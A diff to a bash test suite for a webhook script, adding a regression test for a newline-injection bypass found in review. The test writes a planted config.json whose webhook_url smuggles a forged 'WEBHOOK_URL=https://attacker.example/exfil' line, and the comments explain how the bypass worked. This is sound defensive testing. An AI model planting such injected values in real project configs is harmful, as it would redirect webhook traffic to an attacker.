@@ -53,6 +53,10 @@ assert_match() {
   local label="$1" needle="$2" haystack="$3"
   if printf '%s' "$haystack" | grep -qF -- "$needle"; then pass "$label"; else fail "$label  needle='$needle' not found"; fi
 }
+assert_not_match() {
+  local label="$1" needle="$2" haystack="$3"
+  if printf '%s' "$haystack" | grep -qF -- "$needle"; then fail "$label  unexpected '$needle' present"; else pass "$label"; fi
+}
 assert_empty() {
   local label="$1" value="$2"
   if [ -z "$value" ]; then pass "$label"; else fail "$label  expected empty, got '$value'"; fi
@@ -277,6 +281,47 @@ ERR9="$(cat "$ERR9_TMP")"; rm -f "$ERR9_TMP"
 assert_eq    "case9 exit 0" "0" "$RC9"
 assert_eq    "case9 user-scope URL used (mismatch ignored)" "https://correct.example/hook" "$URL9"
 assert_match "case9 repo_webhook_ignored logged" "repo_webhook_ignored" "$ERR9"
+
+echo ""
+echo "==== Case 9b: newline-injection bypass (PR #249 review finding) ===="
+# resolve-egress-config.sh printed KEY=VALUE lines via jq -r WITHOUT stripping
+# embedded literal newlines from an attacker-controlled JSON string value. A
+# planted repo-relative .supervisor/config.json whose webhook_url field
+# contained "x\nWEBHOOK_URL=https://attacker.example/exfil" (a JSON \n
+# escape, decoded by jq into a real newline) forged an extra
+# "WEBHOOK_URL=..." stdout line this script's naive
+# `while IFS='=' read -r rk rv` loop could not distinguish from a genuinely
+# resolved value — live-reproduced 2026-09-21 with a curl stub: send-webhook.sh
+# actually POSTed to the attacker URL even though NO user-scope egress.json
+# entry exists for this repo's slug at all (the exact fail-closed case Case 7
+# above covers for a plain, non-injected value).
+WD9B="$TMPDIR_TEST/case9b"
+HOME9B="$TMPDIR_TEST/case9b-home"
+mkdir -p "$WD9B/.supervisor" "$WD9B/bin" "$HOME9B"
+git -C "$WD9B" init -q
+git -C "$WD9B" remote add origin "https://github.com/${WH_SLUG}.git"
+python3 -c '
+import json, sys
+payload = {"webhook_url": "x\nWEBHOOK_URL=https://attacker.example/exfil"}
+open(sys.argv[1], "w").write(json.dumps(payload))
+' "$WD9B/.supervisor/config.json"
+wh_curl_stub "$WD9B/bin/curl"
+CURL_TARGET9B="$WD9B/curl-target.txt"
+ERR9B_TMP="$(mktemp)"
+( cd "$WD9B" \
+  && unset LOOMWRIGHT_WEBHOOK_URL \
+  && HOME="$HOME9B" CURL_TARGET_FILE="$CURL_TARGET9B" PATH="$WD9B/bin:$PATH" \
+     bash "$WEBHOOK" --event-type gate --gate-type rubric --iteration 1 --session-id s9b >/dev/null 2>"$ERR9B_TMP" )
+RC9B=$?
+ERR9B="$(cat "$ERR9B_TMP")"; rm -f "$ERR9B_TMP"
+assert_eq     "case9b exit 0" "0" "$RC9B"
+assert_absent "case9b no POST — forged WEBHOOK_URL= line must not fire the webhook" "$CURL_TARGET9B"
+# The newline-carrying value is blanked by the resolver BEFORE it is even
+# treated as a request (see resolve-egress-config.sh's strip_if_newline), so
+# it no longer registers as a REPO_REQUESTED_WEBHOOK_URL at all — this is
+# stricter than Case 7/9's "logged and ignored" path, not merely equivalent
+# to it, so no repo_webhook_ignored line is expected here.
+assert_not_match "case9b no forged url leaks onto stderr" "attacker.example/exfil" "$ERR9B"
 
 echo ""
 echo "==== Case 10: gate path — hostile-string EXACT round-trip (injection safety) ===="
